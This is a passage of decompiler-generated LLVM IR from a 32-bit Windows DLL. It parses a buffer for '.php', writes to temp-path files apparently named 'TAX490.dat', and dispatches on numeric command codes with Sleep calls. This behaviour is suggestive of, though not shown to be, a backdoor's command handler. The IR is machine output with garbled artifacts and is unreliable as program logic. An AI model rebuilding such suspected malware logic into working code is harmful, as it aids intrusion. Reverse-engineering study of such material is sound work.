  store i32 0, i32* %eax.1.reg2mem
  br label %dec_label_pc_1000c787

dec_label_pc_1000c787:                            ; preds = %dec_label_pc_1000c787.preheader, %dec_label_pc_1000c807
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %stack_var_-16.0.reload = load i32, i32* %stack_var_-16.0.reg2mem
  %55 = add i32 %eax.1.reload, %0
  %56 = inttoptr i32 %55 to i8*, !insn.addr !7292
  %57 = load i8, i8* %56, align 1, !insn.addr !7292
  %58 = icmp eq i8 %57, 46, !insn.addr !7293
  %59 = icmp eq i1 %58, false, !insn.addr !7294
  br i1 %59, label %dec_label_pc_1000c7f0, label %dec_label_pc_1000c78f, !insn.addr !7294

dec_label_pc_1000c78f:                            ; preds = %dec_label_pc_1000c787
  %60 = add i32 %eax.1.reload, %53, !insn.addr !7295
  %61 = inttoptr i32 %60 to i8*, !insn.addr !7295
  %62 = load i8, i8* %61, align 1, !insn.addr !7295
  %63 = icmp eq i8 %62, 112, !insn.addr !7295
  %64 = icmp eq i1 %63, false, !insn.addr !7296
  br i1 %64, label %dec_label_pc_1000c7f0, label %dec_label_pc_1000c796, !insn.addr !7296

dec_label_pc_1000c796:                            ; preds = %dec_label_pc_1000c78f
  %65 = add i32 %55, 2, !insn.addr !7297
  %66 = inttoptr i32 %65 to i8*, !insn.addr !7297
  %67 = load i8, i8* %66, align 1, !insn.addr !7297
  %68 = icmp eq i8 %67, 104, !insn.addr !7297
  %69 = icmp eq i1 %68, false, !insn.addr !7298
  br i1 %69, label %dec_label_pc_1000c7f0, label %dec_label_pc_1000c79d, !insn.addr !7298

dec_label_pc_1000c79d:                            ; preds = %dec_label_pc_1000c796
  %70 = add i32 %55, 3, !insn.addr !7299
  %71 = inttoptr i32 %70 to i8*, !insn.addr !7299
  %72 = load i8, i8* %71, align 1, !insn.addr !7299
  %73 = icmp eq i8 %72, 112, !insn.addr !7299
  %74 = icmp eq i1 %73, false, !insn.addr !7300
  br i1 %74, label %dec_label_pc_1000c7f0, label %dec_label_pc_1000c7a4, !insn.addr !7300

dec_label_pc_1000c7a4:                            ; preds = %dec_label_pc_1000c79d
  %75 = add i32 %eax.1.reload, %54, !insn.addr !7301
  %76 = inttoptr i32 %75 to i8*, !insn.addr !7301
  store i8 %57, i8* %76, align 1, !insn.addr !7301
  %77 = load i8, i8* %61, align 1, !insn.addr !7302
  %78 = add i32 %eax.1.reload, %52
  %79 = add i32 %78, 921, !insn.addr !7303
  %80 = inttoptr i32 %79 to i8*, !insn.addr !7303
  store i8 %77, i8* %80, align 1, !insn.addr !7303
  %81 = load i8, i8* %66, align 1, !insn.addr !7304
  %82 = add i32 %78, 922, !insn.addr !7305
  %83 = inttoptr i32 %82 to i8*, !insn.addr !7305
  store i8 %81, i8* %83, align 1, !insn.addr !7305
  %84 = load i8, i8* %71, align 1, !insn.addr !7306
  %85 = add i32 %78, 923, !insn.addr !7307
  %86 = inttoptr i32 %85 to i8*, !insn.addr !7307
  store i8 %84, i8* %86, align 1, !insn.addr !7307
  %87 = add i32 %eax.1.reload, 4, !insn.addr !7308
  %88 = icmp ult i32 %87, 400, !insn.addr !7309
  %89 = icmp eq i1 %88, false, !insn.addr !7310
  br i1 %89, label %dec_label_pc_1000ce61, label %dec_label_pc_1000c7dd, !insn.addr !7310

dec_label_pc_1000c7dd:                            ; preds = %dec_label_pc_1000c7a4
  %90 = add i32 %87, %54, !insn.addr !7311
  %91 = inttoptr i32 %90 to i8*, !insn.addr !7311
  store i8 0, i8* %91, align 1, !insn.addr !7311
  %92 = add i32 %87, %53, !insn.addr !7312
  store i32 %92, i32* %stack_var_-16.1.reg2mem, !insn.addr !7313
  store i32 %87, i32* %eax.2.reg2mem, !insn.addr !7313
  br label %dec_label_pc_1000c7f7, !insn.addr !7313

dec_label_pc_1000c7f0:                            ; preds = %dec_label_pc_1000c79d, %dec_label_pc_1000c796, %dec_label_pc_1000c78f, %dec_label_pc_1000c787
  %93 = add i32 %54, %eax.1.reload, !insn.addr !7314
  %94 = inttoptr i32 %93 to i8*, !insn.addr !7314
  store i8 %57, i8* %94, align 1, !insn.addr !7314
  store i32 %stack_var_-16.0.reload, i32* %stack_var_-16.1.reg2mem, !insn.addr !7314
  store i32 %eax.1.reload, i32* %eax.2.reg2mem, !insn.addr !7314
  br label %dec_label_pc_1000c7f7, !insn.addr !7314

dec_label_pc_1000c7f7:                            ; preds = %dec_label_pc_1000c7f0, %dec_label_pc_1000c7dd
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %stack_var_-16.1.reload = load i32, i32* %stack_var_-16.1.reg2mem
  br label %dec_label_pc_1000c800, !insn.addr !7315

dec_label_pc_1000c800:                            ; preds = %dec_label_pc_1000c800, %dec_label_pc_1000c7f7
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %95 = inttoptr i32 %edx.1.reload to i8*, !insn.addr !7316
  %96 = load i8, i8* %95, align 1, !insn.addr !7316
  %97 = add i32 %edx.1.reload, 1, !insn.addr !7317
  %98 = icmp eq i8 %96, 0, !insn.addr !7318
  %99 = icmp eq i1 %98, false, !insn.addr !7319
  store i32 %97, i32* %edx.1.reg2mem, !insn.addr !7319
  br i1 %99, label %dec_label_pc_1000c800, label %dec_label_pc_1000c807, !insn.addr !7319

dec_label_pc_1000c807:                            ; preds = %dec_label_pc_1000c800
  %100 = add i32 %eax.2.reload, 1, !insn.addr !7320
  %101 = sub i32 %edx.1.reload, %0, !insn.addr !7321
  %102 = icmp ult i32 %100, %101, !insn.addr !7322
  store i32 %stack_var_-16.1.reload, i32* %stack_var_-16.0.reg2mem, !insn.addr !7323
  store i32 %100, i32* %eax.1.reg2mem, !insn.addr !7323
  store i32 %stack_var_-16.1.reload, i32* %ecx.5.reg2mem, !insn.addr !7323
  br i1 %102, label %dec_label_pc_1000c787, label %dec_label_pc_1000c815, !insn.addr !7323

dec_label_pc_1000c815:                            ; preds = %dec_label_pc_1000c807, %dec_label_pc_1000c777
  %ecx.5.reload = load i32, i32* %ecx.5.reg2mem
  %103 = inttoptr i32 %ecx.5.reload to i8*, !insn.addr !7324
  %104 = bitcast i32* %stack_var_2684 to i8*
  store i8* %104, i8** %stack_var_-44, align 4, !insn.addr !7325
  %105 = call i8* @lstrcpyA(i8* nonnull %104, i8* %103), !insn.addr !7326
  %106 = bitcast i32* %stack_var_1276 to i16*
  store i16* %106, i16** %stack_var_-48, align 4, !insn.addr !7327
  %107 = call i32 @GetTempPathW(i32 200, i16* nonnull %106), !insn.addr !7328
  %108 = bitcast i32* %stack_var_1268 to i16*
  %109 = call i16* @lstrcatW(i16* nonnull %108, i16* getelementptr inbounds ([3 x i16], [3 x i16]* @global_var_100395c0, i32 0, i32 0)), !insn.addr !7329
  %110 = inttoptr i32 %1 to i8*, !insn.addr !7330
  %111 = bitcast i32* %stack_var_3060 to i8*
  store i8* %111, i8** %stack_var_-68, align 4, !insn.addr !7331
  %112 = call i8* @lstrcpyA(i8* nonnull %111, i8* %110), !insn.addr !7332
  br label %dec_label_pc_1000c860, !insn.addr !7333

dec_label_pc_1000c860:                            ; preds = %dec_label_pc_1000c860, %dec_label_pc_1000c815
  %edx.2.reload = load i32, i32* %edx.2.reg2mem
  %113 = inttoptr i32 %edx.2.reload to i8*, !insn.addr !7334
  %114 = load i8, i8* %113, align 1, !insn.addr !7334
  %115 = add i32 %edx.2.reload, 1, !insn.addr !7335
  %116 = icmp eq i8 %114, 0, !insn.addr !7336
  %117 = icmp eq i1 %116, false, !insn.addr !7337
  store i32 %115, i32* %edx.2.reg2mem, !insn.addr !7337
  br i1 %117, label %dec_label_pc_1000c860, label %dec_label_pc_1000c867, !insn.addr !7337

dec_label_pc_1000c867:                            ; preds = %dec_label_pc_1000c860
  %118 = ptrtoint i32* %stack_var_3051 to i32, !insn.addr !7338
  store i32 %118, i32* %edi.0.reg2mem, !insn.addr !7338
  br label %dec_label_pc_1000c871, !insn.addr !7338

dec_label_pc_1000c871:                            ; preds = %dec_label_pc_1000c871, %dec_label_pc_1000c867
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %119 = add i32 %edi.0.reload, 1, !insn.addr !7339
  %120 = inttoptr i32 %119 to i8*
  %121 = load i8, i8* %120, align 1, !insn.addr !7339
  %122 = icmp eq i8 %121, 0, !insn.addr !7340
  %123 = icmp eq i1 %122, false, !insn.addr !7341
  store i32 %119, i32* %edi.0.reg2mem, !insn.addr !7341
  br i1 %123, label %dec_label_pc_1000c871, label %dec_label_pc_1000c879, !insn.addr !7341

dec_label_pc_1000c879:                            ; preds = %dec_label_pc_1000c871
  %124 = sub i32 %115, %0, !insn.addr !7342
  %125 = udiv i32 %124, 4, !insn.addr !7343
  %126 = inttoptr i32 %0 to i8*, !insn.addr !7344
  call void @__asm_rep_movsd_memcpy(i8* %120, i8* %126, i32 %125), !insn.addr !7344
  %127 = select i1 %2, i32 -4, i32 4, !insn.addr !7344
  %128 = mul i32 %125, %127, !insn.addr !7344
  %129 = add i32 %119, %128, !insn.addr !7344
  %130 = and i32 %124, 3, !insn.addr !7345
  %131 = inttoptr i32 %129 to i8*, !insn.addr !7346
  call void @__asm_rep_movsb_memcpy(i8* %131, i8* %131, i32 %130), !insn.addr !7346
  %132 = ptrtoint i32* %stack_var_2684 to i32, !insn.addr !7347
  store i8* %104, i8** %stack_var_-76, align 4, !insn.addr !7348
  %133 = bitcast i16** %stack_var_-48 to i8*
  store i8* %133, i8** %stack_var_-80, align 4, !insn.addr !7349
  %134 = ptrtoint i32* %stack_var_28100 to i32, !insn.addr !7350
  store i32 %134, i32* %stack_var_-84, align 4, !insn.addr !7350
  %135 = ptrtoint i16** %stack_var_-48 to i32, !insn.addr !7351
  %136 = trunc i32 %132 to i8, !insn.addr !7351
  %137 = call i32 @function_1000a4e0(i32 %134, i32 %135, i8 %136, i32 25455), !insn.addr !7351
  %138 = icmp eq i32 %137, 0, !insn.addr !7352
  %139 = icmp eq i1 %138, false, !insn.addr !7353
  br i1 %139, label %dec_label_pc_1000c8d1, label %dec_label_pc_1000c8b7, !insn.addr !7353

dec_label_pc_1000c8b7:                            ; preds = %dec_label_pc_1000c879
  %140 = call i32 @"@__security_check_cookie@4"(), !insn.addr !7354
  ret i32 %140, !insn.addr !7355

dec_label_pc_1000c8d1:                            ; preds = %dec_label_pc_1000c879
  %141 = ptrtoint i32* %stack_var_3052 to i32, !insn.addr !7356
  %142 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !7357
  %143 = load i16*, i16** %stack_var_-48, align 4, !insn.addr !7358
  %magicptr19 = ptrtoint i16* %143 to i32
  store i32 %141, i32* %ecx.6.reg2mem
  store i32 %142, i32* %esp.1.reg2mem
  switch i32 %magicptr19, label %dec_label_pc_1000c901 [
    i32 3, label %dec_label_pc_1000cbe2
    i32 2, label %dec_label_pc_1000cbe2
    i32 1, label %dec_label_pc_1000cbe2
    i32 0, label %dec_label_pc_1000cbe2
    i32 4, label %dec_label_pc_1000cd8e
  ]

dec_label_pc_1000c901:                            ; preds = %dec_label_pc_1000c8d1
  %144 = icmp eq i16* %143, inttoptr (i32 5 to i16*), !insn.addr !7359
  %145 = icmp eq i1 %144, false, !insn.addr !7360
  br i1 %145, label %dec_label_pc_1000c99b, label %dec_label_pc_1000c90a, !insn.addr !7360

dec_label_pc_1000c90a:                            ; preds = %dec_label_pc_1000c901
  %146 = load i32, i32* @global_var_10040940, align 4, !insn.addr !7361
  %147 = icmp eq i32 %146, 0, !insn.addr !7361
  %148 = icmp eq i1 %147, false, !insn.addr !7362
  store i32 %141, i32* %ecx.6.reg2mem, !insn.addr !7362
  store i32 %142, i32* %esp.1.reg2mem, !insn.addr !7362
  br i1 %148, label %dec_label_pc_1000cd8e, label %dec_label_pc_1000c917, !insn.addr !7362

dec_label_pc_1000c917:                            ; preds = %dec_label_pc_1000c90a
  store i8* inttoptr (i32 260 to i8*), i8** %stack_var_-76, align 4, !insn.addr !7363
  %149 = bitcast i32* %stack_var_1652 to i8*
  %150 = call i32 @GetTempPathA(i32 260, i8* nonnull %149), !insn.addr !7364
  %151 = ptrtoint i32* %stack_var_-20 to i32, !insn.addr !7365
  store i32 878202964, i32* %stack_var_-20, align 4, !insn.addr !7366
  store i32 %151, i32* %edx.3.reg2mem, !insn.addr !7367
  br label %dec_label_pc_1000c950, !insn.addr !7367

dec_label_pc_1000c950:                            ; preds = %dec_label_pc_1000c950, %dec_label_pc_1000c917
  %edx.3.reload = load i32, i32* %edx.3.reg2mem
  %152 = inttoptr i32 %edx.3.reload to i8*, !insn.addr !7368
  %153 = load i8, i8* %152, align 1, !insn.addr !7368
  %154 = add i32 %edx.3.reload, 1, !insn.addr !7369
  %155 = icmp eq i8 %153, 0, !insn.addr !7370
  %156 = icmp eq i1 %155, false, !insn.addr !7371
  store i32 %154, i32* %edx.3.reg2mem, !insn.addr !7371
  br i1 %156, label %dec_label_pc_1000c950, label %dec_label_pc_1000c957, !insn.addr !7371

dec_label_pc_1000c957:                            ; preds = %dec_label_pc_1000c950
  %157 = ptrtoint i32* %stack_var_1643 to i32, !insn.addr !7372
  store i32 %157, i32* %edi.1.reg2mem, !insn.addr !7372
  br label %dec_label_pc_1000c961, !insn.addr !7372

dec_label_pc_1000c961:                            ; preds = %dec_label_pc_1000c961, %dec_label_pc_1000c957
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %158 = add i32 %edi.1.reload, 1, !insn.addr !7373
  %159 = inttoptr i32 %158 to i8*
  %160 = load i8, i8* %159, align 1, !insn.addr !7373
  %161 = icmp eq i8 %160, 0, !insn.addr !7374
  %162 = icmp eq i1 %161, false, !insn.addr !7375
  store i32 %158, i32* %edi.1.reg2mem, !insn.addr !7375
  br i1 %162, label %dec_label_pc_1000c961, label %dec_label_pc_1000c969, !insn.addr !7375

dec_label_pc_1000c969:                            ; preds = %dec_label_pc_1000c961
  %163 = sub i32 %154, %151, !insn.addr !7376
  %164 = udiv i32 %163, 4, !insn.addr !7377
  %165 = bitcast i32* %stack_var_-20 to i8*, !insn.addr !7378
  call void @__asm_rep_movsd_memcpy(i8* %159, i8* nonnull %165, i32 %164), !insn.addr !7378
  %166 = mul i32 %164, %127, !insn.addr !7378
  %167 = add i32 %158, %166, !insn.addr !7378
  %168 = and i32 %163, 3, !insn.addr !7379
  %169 = inttoptr i32 %167 to i8*, !insn.addr !7380
  call void @__asm_rep_movsb_memcpy(i8* %169, i8* %169, i32 %168), !insn.addr !7380
  store i8* inttoptr (i32 25455 to i8*), i8** %stack_var_-80, align 4, !insn.addr !7381
  %170 = ptrtoint i32* %stack_var_1644 to i32, !insn.addr !7382
  store i32 %170, i32* %stack_var_-84, align 4, !insn.addr !7382
  %171 = ptrtoint i32* %stack_var_1268 to i32, !insn.addr !7383
  %172 = call i32 @function_1000b150(i32 200, i32 0, i32* nonnull %stack_var_1644, i32 25455), !insn.addr !7384
  %173 = ptrtoint i8** %stack_var_-76 to i32, !insn.addr !7385
  store i32 %171, i32* %ecx.6.reg2mem, !insn.addr !7386
  store i32 %173, i32* %esp.1.reg2mem, !insn.addr !7386
  br label %dec_label_pc_1000cd8e, !insn.addr !7386

dec_label_pc_1000c99b:                            ; preds = %dec_label_pc_1000c901
  %174 = icmp eq i16* %143, inttoptr (i32 6 to i16*), !insn.addr !7387
  %175 = icmp eq i1 %174, false, !insn.addr !7388
  br i1 %175, label %dec_label_pc_1000caef, label %dec_label_pc_1000c9a4, !insn.addr !7388

dec_label_pc_1000c9a4:                            ; preds = %dec_label_pc_1000c99b
  %176 = load i32, i32* @global_var_10040940, align 4, !insn.addr !7389
  %177 = icmp eq i32 %176, 0, !insn.addr !7389
  %178 = icmp eq i1 %177, false, !insn.addr !7390
  store i32 %141, i32* %ecx.6.reg2mem, !insn.addr !7390
  store i32 %142, i32* %esp.1.reg2mem, !insn.addr !7390
  br i1 %178, label %dec_label_pc_1000cd8e, label %dec_label_pc_1000c9b1, !insn.addr !7390

dec_label_pc_1000c9b1:                            ; preds = %dec_label_pc_1000c9a4
  %179 = bitcast i32* %stack_var_6100 to i16*
  store i8* inttoptr (i32 260 to i8*), i8** %stack_var_-76, align 4, !insn.addr !7391
  %180 = call i32 @GetTempPathW(i32 260, i16* nonnull %179), !insn.addr !7392
  %181 = load i128, i128* @global_var_10039970, align 4, !insn.addr !7393
  %182 = call i128 @__asm_movaps(i128 %181), !insn.addr !7393
  %183 = bitcast i32* %stack_var_3052 to i8*
  store i8* %183, i8** %stack_var_-80, align 4, !insn.addr !7394
  %184 = ptrtoint i8** %stack_var_-44 to i32, !insn.addr !7395
  store i32 %184, i32* %stack_var_-84, align 4, !insn.addr !7395
  call void @__asm_movups(i128 %3, i128 %182), !insn.addr !7396
  %185 = call i32 @function_10007430(i32* nonnull @1), !insn.addr !7397
  %186 = icmp slt i32 %185, 0, !insn.addr !7398
  store i32* %stack_var_-84, i32** %esp.0.in.reg2mem, !insn.addr !7399
  br i1 %186, label %dec_label_pc_1000ca26, label %dec_label_pc_1000ca05, !insn.addr !7399

dec_label_pc_1000ca05:                            ; preds = %dec_label_pc_1000c9b1
  %187 = ptrtoint i32* %stack_var_6092 to i32, !insn.addr !7400
  store i32 %187, i32* %stack_var_-96, align 4, !insn.addr !7401
  %188 = call i32 @function_10007500(i32* nonnull %stack_var_6092, i32* nonnull %stack_var_76, i32* nonnull %stack_var_6092), !insn.addr !7402
  store i32* %stack_var_-96, i32** %esp.0.in.reg2mem, !insn.addr !7402
  br label %dec_label_pc_1000ca26, !insn.addr !7402

dec_label_pc_1000ca26:                            ; preds = %dec_label_pc_1000ca05, %dec_label_pc_1000c9b1
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %189 = add i32 %esp.0, 1720, !insn.addr !7403
  %190 = add i32 %esp.0, -4, !insn.addr !7404
  %191 = inttoptr i32 %190 to i32*, !insn.addr !7404
  store i32 %189, i32* %191, align 4, !insn.addr !7404
  %192 = add i32 %esp.0, -8, !insn.addr !7405
  %193 = inttoptr i32 %192 to i32*, !insn.addr !7405
  store i32 260, i32* %193, align 4, !insn.addr !7405
  %194 = add i32 %esp.0, 48, !insn.addr !7406
  %195 = inttoptr i32 %194 to i32*, !insn.addr !7407
  store i32 878202964, i32* %195, align 4, !insn.addr !7407
  %196 = add i32 %esp.0, 52, !insn.addr !7408
  %197 = inttoptr i32 %196 to i32*, !insn.addr !7408
  store i32 1680750905, i32* %197, align 4, !insn.addr !7408
  %198 = add i32 %esp.0, 56, !insn.addr !7409
  %199 = inttoptr i32 %198 to i16*, !insn.addr !7409
  store i16 29793, i16* %199, align 4, !insn.addr !7409
  %200 = add i32 %esp.0, 58, !insn.addr !7410
  %201 = inttoptr i32 %200 to i8*, !insn.addr !7410
  store i8 0, i8* %201, align 2, !insn.addr !7410
  store i32 %194, i32* %edx.4.reg2mem, !insn.addr !7411
  br label %dec_label_pc_1000ca60, !insn.addr !7411

dec_label_pc_1000ca60:                            ; preds = %dec_label_pc_1000ca60, %dec_label_pc_1000ca26
  %edx.4.reload = load i32, i32* %edx.4.reg2mem
  %202 = inttoptr i32 %edx.4.reload to i8*, !insn.addr !7412
  %203 = load i8, i8* %202, align 1, !insn.addr !7412
  %204 = add i32 %edx.4.reload, 1, !insn.addr !7413
  %205 = icmp eq i8 %203, 0, !insn.addr !7414
  %206 = icmp eq i1 %205, false, !insn.addr !7415
  store i32 %204, i32* %edx.4.reg2mem, !insn.addr !7415
  br i1 %206, label %dec_label_pc_1000ca60, label %dec_label_pc_1000ca67, !insn.addr !7415

dec_label_pc_1000ca67:                            ; preds = %dec_label_pc_1000ca60
  %207 = add i32 %esp.0, 1711, !insn.addr !7416
  store i32 %207, i32* %edi.2.reg2mem, !insn.addr !7416
  br label %dec_label_pc_1000ca71, !insn.addr !7416

dec_label_pc_1000ca71:                            ; preds = %dec_label_pc_1000ca71, %dec_label_pc_1000ca67
  %edi.2.reload = load i32, i32* %edi.2.reg2mem
  %208 = add i32 %edi.2.reload, 1, !insn.addr !7417
  %209 = inttoptr i32 %208 to i8*
  %210 = load i8, i8* %209, align 1, !insn.addr !7417
  %211 = icmp eq i8 %210, 0, !insn.addr !7418
  %212 = icmp eq i1 %211, false, !insn.addr !7419
  store i32 %208, i32* %edi.2.reg2mem, !insn.addr !7419
  br i1 %212, label %dec_label_pc_1000ca71, label %dec_label_pc_1000ca79, !insn.addr !7419

dec_label_pc_1000ca79:                            ; preds = %dec_label_pc_1000ca71
  %213 = sub i32 %204, %194, !insn.addr !7420
  %214 = add i32 %esp.0, 5160, !insn.addr !7421
  %215 = udiv i32 %213, 4, !insn.addr !7422
  %216 = inttoptr i32 %194 to i8*, !insn.addr !7423
  call void @__asm_rep_movsd_memcpy(i8* %209, i8* %216, i32 %215), !insn.addr !7423
  %217 = mul i32 %215, %127, !insn.addr !7423
  %218 = add i32 %208, %217, !insn.addr !7423
  %219 = add i32 %esp.0, -12, !insn.addr !7424
  %220 = inttoptr i32 %219 to i32*, !insn.addr !7424
  store i32 1000, i32* %220, align 4, !insn.addr !7424
  %221 = and i32 %213, 3, !insn.addr !7425
  %222 = add i32 %esp.0, -16, !insn.addr !7426
  %223 = inttoptr i32 %222 to i32*, !insn.addr !7426
  store i32 0, i32* %223, align 4, !insn.addr !7426
  %224 = inttoptr i32 %218 to i8*, !insn.addr !7427
  call void @__asm_rep_movsb_memcpy(i8* %224, i8* %224, i32 %221), !insn.addr !7427
  %225 = add i32 %esp.0, -20, !insn.addr !7428
  %226 = inttoptr i32 %225 to i32*, !insn.addr !7428
  store i32 %214, i32* %226, align 4, !insn.addr !7428
  %227 = call i32* @_memset(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7429
  store i32 ptrtoint ([731 x i8]* @global_var_100395d0 to i32), i32* %220, align 4, !insn.addr !7430
  store i32 %214, i32* %223, align 4, !insn.addr !7431
  %228 = call i8* @lstrcpyA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7432
  store i32 0, i32* %226, align 4, !insn.addr !7433
  %229 = add i32 %esp.0, 5152, !insn.addr !7434
  %230 = add i32 %esp.0, -24, !insn.addr !7435
  %231 = inttoptr i32 %230 to i32*, !insn.addr !7435
  store i32 %229, i32* %231, align 4, !insn.addr !7435
  %232 = add i32 %esp.0, -28, !insn.addr !7436
  %233 = inttoptr i32 %232 to i32*, !insn.addr !7436
  store i32 10000, i32* %233, align 4, !insn.addr !7436
  call void @Sleep(i32 ptrtoint (i32* @1 to i32)), !insn.addr !7437
  %234 = add i32 %esp.0, -32, !insn.addr !7438
  %235 = inttoptr i32 %234 to i32*, !insn.addr !7438
  store i32 25455, i32* %235, align 4, !insn.addr !7438
  %236 = add i32 %esp.0, 1692, !insn.addr !7439
  %237 = add i32 %esp.0, -36, !insn.addr !7440
  %238 = inttoptr i32 %237 to i32*, !insn.addr !7440
  store i32 %236, i32* %238, align 4, !insn.addr !7440
  %239 = add i32 %esp.0, -40, !insn.addr !7441
  %240 = inttoptr i32 %239 to i32*, !insn.addr !7441
  store i32 0, i32* %240, align 4, !insn.addr !7441
  %241 = load i32, i32* %191, align 4, !insn.addr !7442
  %242 = add i32 %esp.0, -44, !insn.addr !7442
  %243 = inttoptr i32 %242 to i32*, !insn.addr !7442
  store i32 %241, i32* %243, align 4, !insn.addr !7442
  %244 = load i32, i32* %220, align 4, !insn.addr !7443
  %245 = call i32 @function_1000bae0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7444
  store i32 %244, i32* %ecx.6.reg2mem, !insn.addr !7445
  store i32 %232, i32* %esp.1.reg2mem, !insn.addr !7445
  br label %dec_label_pc_1000cd8e, !insn.addr !7445

dec_label_pc_1000caef:                            ; preds = %dec_label_pc_1000c99b
  %246 = icmp eq i16* %143, inttoptr (i32 7 to i16*), !insn.addr !7446
  store i32 %141, i32* %ecx.6.reg2mem, !insn.addr !7447
  store i32 %142, i32* %esp.1.reg2mem, !insn.addr !7447
  br i1 %246, label %dec_label_pc_1000cd8e, label %dec_label_pc_1000caf8, !insn.addr !7447

dec_label_pc_1000caf8:                            ; preds = %dec_label_pc_1000caef
  %247 = icmp eq i16* %143, inttoptr (i32 8 to i16*), !insn.addr !7448
  %248 = icmp eq i1 %247, false, !insn.addr !7449
  br i1 %248, label %dec_label_pc_1000cb1c, label %dec_label_pc_1000cafd, !insn.addr !7449

dec_label_pc_1000cafd:                            ; preds = %dec_label_pc_1000caf8
  %249 = bitcast i32* %stack_var_8100 to i8*
  store i8* %249, i8** %stack_var_-76, align 4, !insn.addr !7450
  %250 = bitcast i32* %stack_var_3052 to i8*
  store i8* %250, i8** %stack_var_-80, align 4, !insn.addr !7451
  store i32 %132, i32* %stack_var_-84, align 4, !insn.addr !7452
  %251 = call i32 @function_1000b150(i32 %132, i32 %141, i32* nonnull %stack_var_8100, i32 1), !insn.addr !7453
  store i32 200, i32* %ecx.6.reg2mem, !insn.addr !7454
  store i32 %142, i32* %esp.1.reg2mem, !insn.addr !7454
  br label %dec_label_pc_1000cd8e, !insn.addr !7454

dec_label_pc_1000cb1c:                            ; preds = %dec_label_pc_1000caf8
  %252 = icmp eq i16* %143, inttoptr (i32 9 to i16*), !insn.addr !7455
  %253 = icmp eq i16* %143, inttoptr (i32 10 to i16*), !insn.addr !7456
  %254 = icmp eq i1 %253, false, !insn.addr !7457
  %or.cond = or i1 %252, %254
  store i32 %141, i32* %ecx.6.reg2mem, !insn.addr !7458
  store i32 %142, i32* %esp.1.reg2mem, !insn.addr !7458
  br i1 %or.cond, label %dec_label_pc_1000cd8e, label %dec_label_pc_1000cb2e, !insn.addr !7458

dec_label_pc_1000cb2e:                            ; preds = %dec_label_pc_1000cb1c
  %255 = load i32, i32* %stack_var_-36, align 4, !insn.addr !7459
  %256 = bitcast i32* %stack_var_8100 to i8*
  store i8* %256, i8** %stack_var_-76, align 4, !insn.addr !7460
  %257 = call i32 @function_10003760(i32* nonnull %stack_var_8100, i32 %255), !insn.addr !7461
  store i8* inttoptr (i32 260 to i8*), i8** %stack_var_-76, align 4, !insn.addr !7462
  %258 = bitcast i32* %stack_var_1652 to i8*
  %259 = call i32 @GetTempPathA(i32 260, i8* nonnull %258), !insn.addr !7463
  %260 = ptrtoint i32* %stack_var_-20 to i32, !insn.addr !7464
  store i32 1514360132, i32* %stack_var_-20, align 4, !insn.addr !7465
  store i32 %260, i32* %edx.5.reg2mem, !insn.addr !7466
  br label %dec_label_pc_1000cb80, !insn.addr !7466

dec_label_pc_1000cb80:                            ; preds = %dec_label_pc_1000cb80, %dec_label_pc_1000cb2e
  %edx.5.reload = load i32, i32* %edx.5.reg2mem
  %261 = inttoptr i32 %edx.5.reload to i8*, !insn.addr !7467
  %262 = load i8, i8* %261, align 1, !insn.addr !7467
  %263 = add i32 %edx.5.reload, 1, !insn.addr !7468
  %264 = icmp eq i8 %262, 0, !insn.addr !7469
  %265 = icmp eq i1 %264, false, !insn.addr !7470
  store i32 %263, i32* %edx.5.reg2mem, !insn.addr !7470
  br i1 %265, label %dec_label_pc_1000cb80, label %dec_label_pc_1000cb87, !insn.addr !7470

dec_label_pc_1000cb87:                            ; preds = %dec_label_pc_1000cb80
  %266 = ptrtoint i32* %stack_var_1643 to i32, !insn.addr !7471
  store i32 %266, i32* %edi.3.reg2mem, !insn.addr !7471
  br label %dec_label_pc_1000cb91, !insn.addr !7471

dec_label_pc_1000cb91:                            ; preds = %dec_label_pc_1000cb91, %dec_label_pc_1000cb87
  %edi.3.reload = load i32, i32* %edi.3.reg2mem
  %267 = add i32 %edi.3.reload, 1, !insn.addr !7472
  %268 = inttoptr i32 %267 to i8*
  %269 = load i8, i8* %268, align 1, !insn.addr !7472
  %270 = icmp eq i8 %269, 0, !insn.addr !7473
  %271 = icmp eq i1 %270, false, !insn.addr !7474
  store i32 %267, i32* %edi.3.reg2mem, !insn.addr !7474
  br i1 %271, label %dec_label_pc_1000cb91, label %dec_label_pc_1000cb99, !insn.addr !7474

dec_label_pc_1000cb99:                            ; preds = %dec_label_pc_1000cb91
  %272 = sub i32 %263, %260, !insn.addr !7475
  %273 = udiv i32 %272, 4, !insn.addr !7476
  %274 = bitcast i32* %stack_var_-20 to i8*, !insn.addr !7477
  call void @__asm_rep_movsd_memcpy(i8* %268, i8* nonnull %274, i32 %273), !insn.addr !7477
  %275 = mul i32 %273, %127, !insn.addr !7477
  %276 = add i32 %267, %275, !insn.addr !7477
  %277 = and i32 %272, 3, !insn.addr !7478
  %278 = inttoptr i32 %276 to i8*, !insn.addr !7479
  call void @__asm_rep_movsb_memcpy(i8* %278, i8* %278, i32 %277), !insn.addr !7479
  store i8* inttoptr (i32 25455 to i8*), i8** %stack_var_-80, align 4, !insn.addr !7480
  %279 = ptrtoint i32* %stack_var_1644 to i32, !insn.addr !7481
  store i32 %279, i32* %stack_var_-84, align 4, !insn.addr !7481
  %280 = ptrtoint i32* %stack_var_1268 to i32, !insn.addr !7482
  %281 = call i32 @function_1000b150(i32 200, i32 0, i32* nonnull %stack_var_1644, i32 25455), !insn.addr !7483
  store i8* inttoptr (i32 1000 to i8*), i8** %stack_var_-80, align 4, !insn.addr !7484
  call void @Sleep(i32 1000), !insn.addr !7485
  %282 = ptrtoint i32* %stack_var_1640 to i32, !insn.addr !7486
  store i32 %282, i32* %stack_var_-84, align 4, !insn.addr !7486
  %283 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !7486
  store i32 %280, i32* %ecx.6.reg2mem, !insn.addr !7487
  store i32 %283, i32* %esp.1.reg2mem, !insn.addr !7487
